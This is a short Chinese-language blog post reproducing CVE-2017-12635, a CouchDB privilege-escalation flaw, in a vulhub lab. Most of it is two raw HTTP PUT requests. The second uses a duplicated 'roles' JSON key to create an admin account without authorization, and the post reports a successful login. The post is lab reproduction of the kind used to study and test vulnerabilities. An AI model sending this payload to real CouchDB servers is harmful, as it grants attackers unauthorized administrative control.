---
layout: post
title: "vulhub漏洞复现"
date: 2019-6-10 20:49:43
author: co0ontty
categories: 漏洞复现 ALL
tags: 漏洞复现 python ALL 
cover: 'https://i.loli.net/2019/06/10/5cfe32a6be6cf32080.png'
---

## Couchdb 垂直权限绕过漏洞（CVE-2017-12635）

Path:couchdb/CVE-2017-12635

### 漏洞复现：

#### 发送创建用户的请求包

```textile
PUT /_users/org.couchdb.user:username HTTP/1.1

Host: your-ip:5984

Accept: */*

Accept-Language: en

User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

Connection: close

Content-Type: application/json

Content-Length: 96

{

  "type": "user",

  "name": "username",

  "roles": ["_admin"],

  "password": "password"

}
```

服务器返回错误，仅允许admin用户添加用户

![5cfe35326689f17529](https://i.loli.net/2019/06/10/5cfe35326689f17529.png)

```textile
PUT /_users/org.couchdb.user:username HTTP/1.1

Host: your-ip:5984

Accept: */*

Accept-Language: en

User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

Connection: close

Content-Type: application/json

Content-Length: 111

{

  "type": "user",

  "name": "username",

  "roles": ["_admin"],

  "roles":[],

  "password": "password"
}
```

成功创建用户

![5cfe365ebd34e80865](https://i.loli.net/2019/06/10/5cfe365ebd34e80865.png)

登陆成功 

![5cfe364f25d8a64339](https://i.loli.net/2019/06/10/5cfe364f25d8a64339.png)
